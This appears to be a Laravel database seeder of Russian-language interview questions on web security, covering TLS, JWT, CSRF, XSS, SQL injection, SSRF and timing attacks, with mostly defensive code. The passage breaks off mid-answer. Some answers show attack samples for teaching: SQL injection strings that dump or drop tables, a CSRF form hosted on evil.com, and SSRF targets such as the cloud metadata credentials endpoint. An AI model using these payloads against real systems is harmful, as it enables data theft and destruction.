<?php

namespace Database\Seeders\Data\Categories\SystemDesign;

class Security
{
    public static function all(): array
    {
        return [
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое HTTPS и TLS простыми словами?',
                'answer' => '**HTTPS = HTTP + TLS**. **TLS** (Transport Layer Security) — криптографический протокол, **шифрующий** передачу данных по сети.

Аналогия: **HTTP** — открытка, которую может прочесть любой почтальон. **HTTPS** — **запечатанный конверт**.

**Три задачи TLS:**

1. **Шифрование** — никто не подслушает по дороге (Wi-Fi, провайдер, прокси)
2. **Аутентификация сервера** — через **сертификат**, подписанный CA: «это действительно `github.com`, а не подделка»
3. **Целостность** — данные не подменены в пути (MITM не вставит свой JS)

**Сертификаты:** выдаёт **CA** (Certificate Authority — Let\'s Encrypt, DigiCert). Браузер проверяет цепочку до **корневого CA**, которому он уже доверяет.

**Версии:**

- `SSL 1.0`/`2.0`/`3.0` — **устарели, дырявые**, выключить
- `TLS 1.0`/`1.1` — **тоже устарели** (POODLE, BEAST)
- `TLS 1.2` — **минимум** для прода
- `TLS 1.3` — современный, **быстрее** (1-RTT handshake), меньше алгоритмов = меньше дыр

**В Laravel:** `URL::forceScheme(\'https\')` или `APP_URL=https://...` + редирект через `nginx`/middleware.',
                'difficulty' => 2,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Как работает TLS handshake простыми словами?',
                'answer' => 'TLS handshake (рукопожатие) - обмен между клиентом и сервером перед началом шифрования: 1) клиент: "привет, поддерживаю эти алгоритмы", 2) сервер: "выбираю этот, вот мой сертификат", 3) клиент проверяет сертификат через CA (центр сертификации), 4) обмениваются ключами через асимметричную криптографию: в TLS ≤ 1.2 это RSA-KE или (EC)DHE; в TLS 1.3 RSA-key-exchange удалён полностью, остались только (EC)DHE и PSK (RSA в 1.3 живёт только как алгоритм подписи сертификата), 5) договариваются о симметричном ключе для скорости, 6) дальше всё шифруется этим ключом. TLS 1.3 сократил full handshake до 1 RTT, resumption — до 0 RTT.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'В чём разница между аутентификацией и авторизацией?',
                'answer' => 'Два этапа защиты доступа, которые **часто путают**.

- **Аутентификация** (**AuthN**) — **«кто ты?»** Проверка **личности**: логин/пароль, токен, биометрия, magic link, OAuth. Результат — «ты тот, кем называешься».
- **Авторизация** (**AuthZ**) — **«что тебе можно?»** Проверка **прав** на действие: роли, permissions, ownership, policies. Результат — «можно/нельзя выполнить эту операцию».

Аналогия: на проходной показал **паспорт** — **аутентифицировали** (это действительно ты). Чтобы войти в **серверную** — проверили **разрешение** в списке допуска, **авторизовали** (тебе сюда можно).

**Порядок всегда один:** сначала AuthN, потом AuthZ. Без аутентификации авторизация не имеет смысла — кому права раздавать?

**Типичные коды ответа:**

- `401 Unauthorized` — **AuthN не прошла** (нет/невалидный токен) — несмотря на имя, это про **аутентификацию**
- `403 Forbidden` — **AuthZ не прошла** (аутентифицирован, но прав нет)

**В Laravel:**

- AuthN: `auth` middleware, `Auth::attempt()`, guards, Sanctum/Fortify
- AuthZ: `Gate::define()`, **Policies**, `$this->authorize()`, middleware `can:update,post`',
                'code_example' => '<?php
// AuthN — кто ты?
Route::middleware("auth")->group(function () {
    // AuthZ — что тебе можно?
    Route::put("/posts/{post}", [PostController::class, "update"])
        ->middleware("can:update,post");
});

// Внутри контроллера
public function update(Request $request, Post $post) {
    $this->authorize("update", $post); // AuthZ через PostPolicy@update
    $post->update($request->validated());
}',
                'code_language' => 'php',
                'difficulty' => 2,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое OAuth 2.0 и какие у него grant types?',
                'answer' => 'OAuth 2.0 - стандарт делегирования доступа. Простыми словами: ты разрешаешь приложению X получить доступ к твоим данным на сервисе Y, не отдавая пароль. 4 основных grant type: 1) Authorization Code - для веб-приложений с бэкендом (самый безопасный), 2) Client Credentials - сервис-сервис, 3) Resource Owner Password Credentials - устаревший, прямой логин/пароль, 4) Implicit - устарел, заменён на Code+PKCE для SPA.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое JWT и какие плюсы и минусы?',
                'answer' => '**JWT** (JSON Web Token, `RFC 7519`) — **подписанный токен** из трёх частей через точку: `header.payload.signature`, каждая часть **base64url-кодирована**.

**Структура:**

- **header** — `{"alg":"HS256","typ":"JWT"}` — алгоритм подписи
- **payload** — `claims`: `sub` (user id), `iat`, `exp`, `aud`, кастомные роли
- **signature** — `HMAC` или `RSA`/`ECDSA` от `header.payload` секретом/приватным ключом

**Алгоритмы подписи:**

- **симметричные** — `HS256`/`HS384`/`HS512` (HMAC, один секрет)
- **асимметричные** — `RS256`/`ES256` (приватный подписывает, публичный проверяет — удобно для микросервисов)

**Плюсы:**

- **stateless** — сервер не хранит сессию, любой инстанс с ключом проверит
- **межсервисная аутентификация** — Service B верифицирует токен Service A через публичный ключ
- удобно для **SPA / mobile** клиентов

**Минусы:**

- **нельзя отозвать до `exp`** без серверного blacklist — теряем stateless
- **размер больше cookie** `session_id` (сотни байт vs ~30)
- **payload не зашифрован**, только подписан — НЕ клади туда чувствительное (для шифрования — `JWE`)
- классические атаки: `alg=none`, `RS256→HS256 confusion` (публичный ключ скармливают как HMAC-секрет) — обязателен **явный allow-list алгоритмов**

**Митигация:** короткий `exp` (5–15 мин) + **refresh token** в БД, явный `aud`/`iss`-чек, библиотеки с защитой от `alg=none`.',
                'code_example' => '<?php
use Firebase\\JWT\\JWT;
use Firebase\\JWT\\Key;

// Issue
$jwt = JWT::encode([
    "sub" => $user->id,
    "iat" => time(),
    "exp" => time() + 900,        // 15 минут
    "aud" => "api.example.com",
], $secret, "HS256");

// Verify — ОБЯЗАТЕЛЬНО явный allow-list алгоритмов
$payload = JWT::decode($jwt, new Key($secret, "HS256"));

// ❌ Уязвимо: позволяет alg=none / алгоритм-confusion
// JWT::decode($jwt, new Key($secret));  // без явного алгоритма

// Структура: header.payload.signature
// eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJleHAiOjE3MDB9.<base64-signature>',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'JWT vs server-side sessions - что выбрать?',
                'answer' => 'Server-side session: сервер хранит сессию (Redis/БД), клиенту даёт session_id в HttpOnly cookie. Плюсы: моментальная отзываемость (удалил из Redis - session мертва), маленький cookie, изменения профиля видны сразу. Минусы: каждый запрос идёт в session store, нужен общий store при горизонтальном масштабировании. JWT: токен с подписью, сервер ничего не помнит. Плюсы: stateless, любой микросервис верифицирует через public key, хорош для distributed/edge. Минусы: отзыв сложен (blacklist убивает stateless), большой размер. Правило: monolith с одной БД сессии - sessions проще; распределённые системы и B2B SSO - JWT (или opaque tokens с introspection как в OAuth2).',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое access token и refresh token?',
                'answer' => 'Пара токенов разной длительности жизни — компромисс между **stateless-производительностью** и **возможностью отзыва**.

| | **Access token** | **Refresh token** |
|---|---|---|
| **Срок жизни** | 5–15 мин (до 1 ч) | дни / недели / месяцы |
| **Назначение** | пропуск к API на каждом запросе | обмен на новый `access` без перелогина |
| **Хранение клиентом** | память приложения / `Authorization: Bearer` | **HttpOnly + Secure + SameSite** cookie |
| **Где валидируется** | по подписи (`stateless`) | по записи в БД (`stateful`) |
| **Можно отозвать?** | нет, ждём `exp` | да, удалили из БД |

**Поток (flow):**

1. Клиент логинится → сервер выдаёт **пару**: `access` (15 мин) + `refresh` (30 дней)
2. Клиент шлёт `access` в `Authorization: Bearer ...` на каждый запрос
3. Когда API ответил `401` → клиент идёт на `POST /auth/refresh` с `refresh`
4. Сервер проверяет `refresh` в БД → выдаёт **новую пару**, старый `refresh` помечает использованным (**rotation**)
5. **Logout** = удаление `refresh` из БД, максимум через 15 мин старый `access` сам умрёт

**Зачем такой огород:**

- `access` короткий → утечка ограничена 15 минутами
- `refresh` хранится в БД → можно мгновенно **отозвать** (logout, смена пароля, бан)
- **rotation + reuse detection** — если кто-то использовал тот же `refresh` дважды, инвалидируем всю цепочку (украли)

Это стандарт **OAuth 2.0** и `Laravel Sanctum` / `Passport`.',
                'code_example' => '<?php
// POST /auth/login
return response()->json([
    "access_token" => JWT::encode([
        "sub" => $user->id,
        "exp" => time() + 900,                   // 15 минут
    ], $secret, "HS256"),
    "refresh_token" => DB::table("refresh_tokens")->insertGetId([
        "user_id" => $user->id,
        "token_hash" => hash("sha256", $raw = bin2hex(random_bytes(32))),
        "expires_at" => now()->addDays(30),
    ]) ? $raw : null,
]);

// POST /auth/refresh (rotation + reuse detection)
$row = DB::table("refresh_tokens")
    ->where("token_hash", hash("sha256", $raw))
    ->first();

if (!$row || $row->revoked_at) {
    // reuse detected — инвалидируем всю цепочку
    DB::table("refresh_tokens")->where("user_id", $row?->user_id)->update(["revoked_at" => now()]);
    abort(401);
}

// rotate: старый refresh помечаем, выдаём новую пару',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое RBAC и ABAC?',
                'answer' => 'Две модели **авторизации** (`AuthZ`), решающие «что юзеру можно делать».

**RBAC** (Role-Based Access Control) — доступ **через роли**:

- у пользователя одна или несколько **ролей** (`admin`, `editor`, `viewer`)
- у каждой роли — **набор permissions** (`posts.create`, `posts.delete`)
- проверка: «есть ли у юзера роль с нужным permission?»
- **прост в понимании**, легко рисуется матрицей `роль × ресурс`
- слабо учитывает **контекст** — нельзя сказать «редактировать может только автор поста»

**ABAC** (Attribute-Based Access Control) — доступ **через атрибуты**:

- решение строится из **атрибутов**: `subject` (юзер: `department=sales`), `resource` (пост: `owner_id=42`), `action` (`edit`), `environment` (`time`, `IP`)
- правила вида: «`edit` разрешён, если `subject.id == resource.owner_id` ИЛИ `subject.role == admin`»
- **гибко**, легко выражать ownership, time-based, location-based
- сложнее аудит — правила могут пересекаться, нужны политики (`OPA`, `Cedar`, `XACML`)

**Сравнение:**

| | **RBAC** | **ABAC** |
|---|---|---|
| **Гранулярность** | роль → permissions | per-resource атрибуты |
| **Контекст** | плохо | отлично |
| **Сложность** | низкая | высокая |
| **Когда брать** | стандартные приложения | сложные домены (медицина, банки) |

**На практике** — комбинируют: **RBAC как база** (роль `editor` даёт `posts.edit`) + **ABAC-правила сверху** (ownership: только свой пост).

**В Laravel:** `RBAC` — `spatie/laravel-permission`; `ABAC` — `Gate::define()` / `Policies` с проверкой ownership и контекста.',
                'code_example' => '<?php
// RBAC через spatie/laravel-permission
$user->assignRole("editor");
$user->givePermissionTo("posts.publish");
if ($user->hasPermissionTo("posts.publish")) { /* ... */ }

// ABAC через Policy: правило учитывает атрибуты ресурса и контекста
class PostPolicy
{
    public function update(User $user, Post $post): bool
    {
        return $user->id === $post->author_id        // ownership
            || $user->hasRole("admin")               // RBAC fallback
            || ($user->department === $post->department
                && now()->isBetween("09:00", "18:00")); // environment
    }
}

// Gate::authorize("update", $post) → 403, если правило не прошло',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое CORS простыми словами?',
                'answer' => '**CORS** (Cross-Origin Resource Sharing) — **механизм браузера**, контролирующий, может ли **cross-origin JS читать ответ** другого `origin`.

**Контекст — Same-Origin Policy (SOP):** браузер по умолчанию **запрещает** сайту `example.com` через `fetch`/`XHR` читать ответ от `api.other.com`. `origin` = `схема + хост + порт`.

`CORS` — это **способ для сервера явно разрешить** определённым origin-ам читать ответ через заголовки.

**Заголовки на сервере:**

- `Access-Control-Allow-Origin: https://example.com` — кому разрешено (или `*` для публичных API без credentials)
- `Access-Control-Allow-Methods: GET, POST, PUT, DELETE`
- `Access-Control-Allow-Headers: Content-Type, Authorization`
- `Access-Control-Allow-Credentials: true` — разрешить отправку cookie (тогда `Allow-Origin` НЕ может быть `*`)
- `Access-Control-Max-Age: 86400` — кэш preflight ответа в браузере

**Preflight (`OPTIONS`)** — браузер шлёт **перед** «сложным» запросом (методы кроме `GET`/`POST`/`HEAD`, `Authorization`, кастомные заголовки, `Content-Type: application/json`):

```
OPTIONS /api/users HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization
```

Сервер отвечает заголовками — браузер пускает или режет.

**ВАЖНО — что CORS НЕ делает:**

- **НЕ защита от XSS** — XSS лечится экранированием, `CSP`, `HttpOnly`
- **НЕ защита от CSRF** — CSRF лечится токенами + `SameSite`-cookie
- **НЕ защита сервера** — `curl`/Postman игнорируют CORS, это **только браузер**
- НЕ запрещает запрос — запрос **уйдёт** на сервер, браузер просто **не отдаст ответ JS-у**

**Типичные ошибки:** `*` + `Allow-Credentials: true` (браузер отбросит), забыли `OPTIONS` в роутах → `405` на preflight.',
                'code_example' => '# Сервер на preflight (OPTIONS)
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400

# В Laravel — config/cors.php
# "paths" => ["api/*"],
# "allowed_origins" => ["https://example.com"],
# "allowed_methods" => ["*"],
# "supports_credentials" => true,',
                'code_language' => 'bash',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое CSRF и как защищаться?',
                'answer' => '**CSRF** (Cross-Site Request Forgery) — атака, в которой **вредоносный сайт через браузер жертвы** заставляет её **отправить запрос** на доверенный сайт, используя её **активную сессию** (cookie).

**Сценарий атаки:**

1. Жертва залогинена в `bank.com` — в браузере живёт sessionId-cookie
2. Жертва открывает `evil.com`, на нём `<form action="https://bank.com/transfer" method="POST">` с автосабмитом
3. Браузер автоматически **прикладывает cookie** `bank.com` к запросу
4. `bank.com` видит валидную сессию — выполняет перевод от имени жертвы

**Защиты (нужно несколько слоёв):**

1. **CSRF-токен** (synchronizer token) — сервер генерирует случайный токен на сессию, кладёт в форму **скрытым полем**. На `evil.com` токена нет — запрос отбрасывается. В Laravel — `@csrf` директива + `VerifyCsrfToken` middleware.
2. **`SameSite` cookie** — флаг `SameSite=Lax` или `Strict` запрещает браузеру слать cookie в кросс-доменных запросах. С `Lax` (по умолчанию в современных браузерах) большая часть CSRF закрыта автоматически.
3. **`Origin`/`Referer` чек** — сервер проверяет, что запрос пришёл с своего домена.
4. **Double-submit cookie** — токен в cookie + в заголовке, сервер сравнивает. Подходит для **stateless API**.

**Что НЕ помогает:**

- HTTPS — атакующий уже не подслушивает, а заставляет жертву отправить запрос
- `HttpOnly` — спасает от XSS-кражи, но cookie всё равно отправляется автоматически
- CORS — это про чтение ответа, а CSRF про **запись запроса**

**Какие методы безопасны:** `GET` (safe) не должен менять состояние. CSRF обычно бьёт по `POST`/`PUT`/`DELETE`.',
                'code_example' => '<!-- Blade: Laravel автоматически добавляет токен -->
<form method="POST" action="/transfer">
    @csrf
    <input name="amount" value="1000">
</form>

<!-- Что получится -->
<input type="hidden" name="_token" value="aBcD1234...">

<!-- AJAX: токен через meta-тег + заголовок X-CSRF-TOKEN -->
<meta name="csrf-token" content="{{ csrf_token() }}">
<script>
fetch("/api/transfer", {
    method: "POST",
    headers: {
        "X-CSRF-TOKEN": document.querySelector("meta[name=csrf-token]").content,
        "Content-Type": "application/json",
    },
    body: JSON.stringify({amount: 1000}),
});
</script>

<!-- config/session.php: SameSite=Lax по умолчанию -->
<!-- "same_site" => "lax" — закрывает большинство CSRF без токена -->',
                'code_language' => 'blade',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое XSS и как защищаться?',
                'answer' => '**XSS** (Cross-Site Scripting) — **инъекция чужого JavaScript** в твою страницу, который потом исполняется **в браузере других пользователей** с их правами.

**Типы:**

- **Stored XSS** — скрипт **сохраняется в БД** (комментарий, профиль) и выдаётся всем посетителям. Самый опасный.
- **Reflected XSS** — скрипт **в URL/параметре**, сервер вернул его в ответ без экранирования. Жертве нужна подготовленная ссылка.
- **DOM-based XSS** — вообще не доходит до сервера: уязвимый клиентский JS пишет `location.hash` в `innerHTML`.

**Что атакующий получает:**

- кражу **cookie** (через `document.cookie`, если нет `HttpOnly`)
- действия **от имени жертвы** (через её активную сессию)
- кейлоггинг, фишинговые формы поверх UI

**Защиты (нужно несколько слоёв):**

1. **Экранирование вывода** — главное. В Laravel `{{ $var }}` (Blade) автоматически делает `htmlspecialchars` с `ENT_QUOTES`. `{!! $var !!}` — **сырой HTML, опасно**.
2. **`Content-Security-Policy`** — браузер исполнит JS **только из разрешённых источников**. Даже если атакующий внедрил `<script>`, CSP его блокирует.
3. **`HttpOnly` cookie** — JS не видит `document.cookie`, кража сессии затруднена.
4. **Санитизация HTML**, если разрешён (комменты с форматированием) — `HTMLPurifier`, `DOMPurify`. Whitelist разрешённых тегов.
5. **Контекстное экранирование** — для атрибутов, JS, CSS, URL разные правила. Внутри `<script>` — `json_encode` с `JSON_HEX_TAG`.

**Главное правило:** **никогда** не вставляй пользовательский ввод в HTML/JS/CSS/URL **сырым**.',
                'code_example' => '<!-- Blade: { { } } автоматически экранирует -->
<div>{{ $comment->text }}</div>
<!-- "<script>alert(1)</script>" → "&lt;script&gt;alert(1)&lt;/script&gt;" -->

<!-- ❌ Опасно — сырой HTML -->
<div>{!! $comment->text !!}</div>

<!-- В JS-контексте: json_encode -->
<script>
    const user = {!! json_encode($user, JSON_HEX_TAG | JSON_HEX_AMP) !!};
</script>

<!-- CSP header -->
Content-Security-Policy:
    default-src \'self\';
    script-src \'self\' \'nonce-abc123\';
    object-src \'none\';

<!-- HttpOnly cookie (config/session.php) -->
"http_only" => true,',
                'code_language' => 'blade',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое OWASP Top 10?',
                'answer' => '**OWASP Top 10** — топ-10 **самых критичных веб-уязвимостей** по версии **Open Web Application Security Project**. Базовый **чек-лист** для аудита и собесов. Версия 2021 (обновляется каждые 3–4 года):

| Код | Категория | Что значит |
|---|---|---|
| **A01** | Broken Access Control | Юзер обходит права (IDOR, force browsing, отсутствие проверки ownership) |
| **A02** | Cryptographic Failures | Plain-text пароли, слабые алгоритмы (`md5`, `RC4`), нет TLS |
| **A03** | Injection | `SQLi`, `NoSQLi`, command injection, LDAP injection |
| **A04** | Insecure Design | Архитектурные ошибки — нет threat modeling, нет rate limit на критичных операциях |
| **A05** | Security Misconfiguration | Дефолтные креды, `debug=true` в проде, открытые `.git`/`.env` |
| **A06** | Vulnerable Components | Устаревшие либы с CVE (`log4j`, `Spring4Shell`) |
| **A07** | Auth Failures | Слабые пароли, brute-force, credential stuffing, session fixation |
| **A08** | Data Integrity Failures | Supply chain (npm/composer-пакеты), unsigned auto-updates, insecure CI/CD |
| **A09** | Logging/Monitoring Failures | Нет логов входов/ошибок → атаку замечают через месяцы |
| **A10** | **SSRF** | Сервер по запросу клиента ходит на внутренний адрес (`169.254.169.254`, Redis) |

**Главное смещение 2021 vs 2017:**

- `Broken Access Control` поднялся с A05 на **A01** — №1 по частоте находок
- Появились **A04 Insecure Design** и **A10 SSRF** — раньше их не было

**Зачем знать:**

- Это **минимум**, который спрашивают на собесах и проверяют пентестеры
- Для каждой категории есть **OWASP Cheat Sheet** с готовыми митигациями
- Compliance (PCI-DSS, SOC 2) часто ссылается на этот список',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое SQL injection и как защищаться?',
                'answer' => '**SQL Injection** — подмена логики SQL-запроса через **непроверенный пользовательский ввод**, который попадает прямо в строку запроса.

**Канонический пример:**

```php
$query = "SELECT * FROM users WHERE name = \'$name\'";
```

При `$name = "\' OR 1=1 --"` запрос становится:

```sql
SELECT * FROM users WHERE name = \'\' OR 1=1 --\'
```

— вернёт всю таблицу. С `\'; DROP TABLE users; --` — снесёт её.

**Чем грозит:**

- **чтение** всех данных (`UNION SELECT password FROM users`)
- **изменение/удаление**
- **эскалация прав** в БД, выполнение команд ОС через `xp_cmdshell` (MSSQL) или функции расширений
- **обход аутентификации** (`OR 1=1 -- ` в логине)

**Защиты (несколько слоёв):**

1. **Prepared statements (параметризация)** — главное. SQL и данные **разделяются**: значение никогда не парсится как SQL.
2. **ORM** (`Eloquent`, `Doctrine`) — параметризует по умолчанию. `User::where("email", $email)` — безопасно.
3. **Whitelist для имён колонок/таблиц** — их **параметризовать нельзя**, только проверять по списку.
4. **Принцип наименьших привилегий** — у app-юзера БД нет `DROP`/`GRANT`/`CREATE USER`.
5. **WAF** (`ModSecurity`, Cloudflare) — дополнительный слой против известных паттернов.
6. **Stored Procedures** — если внутри них тоже параметризация, не динамический SQL.

**Антипаттерны, которые всё ещё ломают:**

- ручной `DB::raw()` со склеиванием строк
- `orderBy($_GET[\'sort\'])` без whitelist — позволяет `ORDER BY (SELECT ...)`
- `LIKE \'%\' . $q . \'%\'` без эскейпа `%` и `_`',
                'code_example' => '<?php
// плохо - SQL injection
$users = DB::select("SELECT * FROM users WHERE email = \'$email\'");

// хорошо - prepared statement
$users = DB::select("SELECT * FROM users WHERE email = ?", [$email]);

// хорошо - Eloquent (под капотом prepared)
$user = User::where("email", $email)->first();

// для имён колонок нужен whitelist
$allowed = ["name", "created_at", "email"];
$column = in_array($sortBy, $allowed) ? $sortBy : "id";
User::orderBy($column)->get();',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Почему нельзя хешировать пароли через md5 или sha256?',
                'answer' => '**`md5` и `sha256` спроектированы быть быстрыми** — именно поэтому **непригодны для паролей**.

**Цифры (для понимания):**

- современный GPU (RTX 4090) считает **~100 млрд `sha256`/сек**
- словарь из 14 млн популярных паролей перебирается **за миллисекунду**
- весь 8-символьный keyspace (`[a-zA-Z0-9]`) — **за час**
- `md5` к тому же **криптографически сломан** (collision attacks с 2004 года)

**Что нужно для паролей — медленные, memory-hard функции:**

| Алгоритм | Год | Параметры | Особенности |
|---|---|---|---|
| **`bcrypt`** | 1999 | `cost` (12+) | Классика, проверен временем. **Лимит 72 байта** на пароль |
| **`scrypt`** | 2009 | `N`, `r`, `p` (память/время/параллелизм) | Memory-hard |
| **`argon2id`** | 2015 | `memory`, `time`, `parallelism` | **Победитель Password Hashing Competition**. Защита от GPU/ASIC. **Современный выбор** |

**Что они делают правильно:**

- **медленные** (50–300 мс на проверку) — атакующий не сможет перебирать миллиарды/сек
- **memory-hard** (`scrypt`, `argon2id`) — требуют МБ памяти на хеш, GPU/ASIC выигрывают мало
- **автоматическая соль** — нет двух одинаковых хешей у одного пароля
- **встроенный параметр сложности** — можно увеличивать `cost` по мере роста железа

**В PHP:**

- `password_hash($pwd, PASSWORD_BCRYPT)` — `bcrypt`, по умолчанию
- `password_hash($pwd, PASSWORD_ARGON2ID)` — **рекомендуется**
- `password_verify()` — проверка (хеш сам несёт алгоритм и соль)
- `password_needs_rehash()` — обновить хеш, если повысили `cost`

**В Laravel:** `Hash::make()` / `Hash::check()`, алгоритм в `config/hashing.php`.',
                'code_example' => '<?php
$hash = password_hash("password123", PASSWORD_ARGON2ID);
if (password_verify($input, $hash)) {
    // OK
}',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое SSRF и как защитить file_get_contents() / Guzzle, если URL вводит пользователь?',
                'answer' => 'SSRF (Server-Side Request Forgery) - атака, при которой злоумышленник заставляет сервер сделать HTTP-запрос на адрес, выбранный атакующим. Канонический пример - функция "preview по URL", "загрузить аватарку из URL", парсер Open Graph. Атакующий передаёт http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS metadata) и читает IAM-credentials, или http://localhost:6379/ (Redis), или http://internal-admin/ - сервер, в отличие от внешнего пользователя, имеет сетевой доступ внутрь VPC. Защита многоуровневая: 1) Allowlist схем - разрешать только http/https, явно запрещать file://, gopher://, dict:// (особенно опасен gopher - можно отправить произвольные байты в любой TCP-сокет, включая Redis/Memcached). 2) Allowlist хостов - если знаете что разрешено (например, только imgur.com), сравнивайте после ресолва. 3) Резолв DNS вручную и проверка IP - блокируйте RFC1918 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), loopback (127.0.0.0/8, ::1), link-local (169.254.0.0/16 - метаданные облака!), 0.0.0.0, multicast. 4) Защита от DNS rebinding - резолвьте имя ОДИН раз и используйте полученный IP для запроса (Guzzle: указать resolve в config), иначе атакующий между TOCTOU подменит ответ DNS на внутренний IP. 5) Отдельный пользователь/network namespace без доступа в private сети. 6) В cloud - запретите IMDSv1, требуйте IMDSv2 с обязательным токеном. 7) Запретите редиректы или проверяйте Location заново - 302 на http://169.254.169.254 обходит примитивную проверку.',
                'code_example' => '<?php
use GuzzleHttp\\Client;

function fetchUserUrl(string $url): string
{
    // 1. allowlist схем
    $parsed = parse_url($url);
    if (!in_array($parsed["scheme"] ?? "", ["http", "https"], true)) {
        throw new InvalidArgumentException("scheme not allowed");
    }

    // 2. резолв и проверка IP до запроса
    $host = $parsed["host"] ?? "";
    $ip = gethostbyname($host);
    if ($ip === $host) throw new RuntimeException("dns resolve failed");

    if (
        filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false
    ) {
        throw new RuntimeException("private/reserved IP: $ip");
    }

    // 3. Guzzle: использовать уже зарезолвленный IP (защита от DNS rebinding)
    $client = new Client([
        "allow_redirects" => false,        // или с onRedirect-хуком, повторно проверяющим IP
        "connect_timeout" => 5,
        "timeout" => 10,
        "force_ip_resolve" => "v4",
        "curl" => [
            CURLOPT_RESOLVE => ["{$host}:443:{$ip}"],
            CURLOPT_PROTOCOLS => CURLPROTO_HTTP | CURLPROTO_HTTPS, // отключить gopher/file
        ],
    ]);

    return (string) $client->get($url)->getBody();
}',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое timing attack и почему для сравнения токенов используют hash_equals(), а не === ?',
                'answer' => 'Timing attack - атака на основе измерения времени работы кода. При сравнении строк через ==/===/strcmp PHP (как и большинство языков) останавливается на первом несовпавшем байте: для "secret123" vs "aecret123" сравнение упадёт после первого байта (микросекунды), а для "secret999" vs "secret123" пройдёт 6 байтов и упадёт на седьмом. Разница - наносекунды, но при тысячах попыток через сеть атакующий может статистически восстановить токен побайтово: сначала перебирает первый символ до момента, когда время чуть растёт (значит, первый совпал), потом второй и т.д. Это реальная атака - именно так в 2014 году взломали один из криптокошельков. Защита: использовать сравнение за константное время - функцию, которая сравнивает все байты независимо от того, где первое расхождение. В PHP это hash_equals($known, $user_supplied) - под капотом XOR-проход по всем байтам с накоплением разницы. Применяется ВЕЗДЕ, где сравниваются криптографические артефакты: CSRF-токены, HMAC-подписи, JWT-сигнатуры, OAuth-state, API-ключи, password hashes (но для паролей лучше password_verify, который сам безопасен), webhook signature verification (Stripe, GitHub). Важно: hash_equals НЕ защищает от других side-channels - если первая операция (например, вычисление hash от user input) тоже зависит от длины ввода, утечка остаётся. Параметры: первый аргумент - известное (server-side) значение, второй - пользовательское; ранний return при разной длине допустим (это не утечка). И ещё: == для строк и так-то опасен - "0e123..." == "0e456..." будет true (оба интерпретируются как 0e... = 0).',
                'code_example' => '<?php
// ❌ Уязвимо к timing attack
function checkApiKey(string $provided): bool
{
    $known = config("api.secret");
    return $provided === $known; // время зависит от позиции расхождения
}

// ✅ Безопасно
function checkApiKey(string $provided): bool
{
    $known = config("api.secret");
    return hash_equals($known, $provided); // константное время
}

// Webhook signature (GitHub-style)
function verifyWebhook(string $payload, string $signatureHeader, string $secret): bool
{
    $expected = "sha256=" . hash_hmac("sha256", $payload, $secret);
    return hash_equals($expected, $signatureHeader);
}

// CSRF
if (!hash_equals($_SESSION["csrf"], $_POST["csrf"] ?? "")) {
    throw new HttpException(419);
}

// ⚠️ Магическое сравнение, опасное даже без timing
var_dump("0e123456" == "0e789012"); // true! оба = 0e... = 0',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Главная проблема JWT - как отозвать токен до истечения срока действия?',
                'answer' => 'Stateless JWT - токен self-contained: сервер не хранит никакого состояния, только проверяет подпись. Это даёт горизонтальное масштабирование (любой инстанс может валидировать), но создаёт фундаментальную проблему: ЕСЛИ токен утёк или пользователь нажал "Logout" / сменил пароль / был забанен - его нельзя отозвать средствами самого JWT. Подписанный токен с exp через 24 часа будет валиден все 24 часа на любом сервере, который доверяет вашему ключу. Решения, в порядке усложнения: 1) Короткий TTL + refresh tokens. Access JWT живёт 5-15 минут, refresh token (хранится в БД, может быть отозван) живёт долго. После logout удаляем refresh из БД - максимум через 15 минут access умрёт. Это де-факто стандарт (OAuth 2.0). 2) Блок-лист (denylist) по jti. В JWT кладут уникальный jti claim; при logout пишут jti в Redis с TTL до exp; на каждый запрос проверяют "не в блок-листе ли этот jti". Это уже частично stateful - теряется главное преимущество JWT, но даёт мгновенный отзыв. 3) Версионирование токенов через user.token_version. У юзера в БД хранится integer; в JWT кладётся claim "ver"; при logout/смене пароля инкремент token_version → все старые токены становятся невалидны. Один SELECT на запрос (можно кешировать). 4) Ротация ключа подписи. Подходит только для глобальных инцидентов 